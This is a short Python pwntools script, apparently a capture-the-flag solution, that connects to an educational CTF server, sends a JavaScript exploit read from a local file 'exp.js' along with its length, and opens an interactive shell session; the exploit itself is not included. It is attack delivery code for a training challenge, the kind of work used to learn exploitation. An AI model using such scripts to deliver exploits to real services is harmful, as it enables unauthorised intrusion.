from pwn import *

p = remote("edu-ctf.zoolab.org", 30219)

with open("exp.js", "r") as f:
    payload = f.read()

p.sendlineafter("your exploit len> ", str(len(payload)))
p.send(payload.encode())

p.interactive()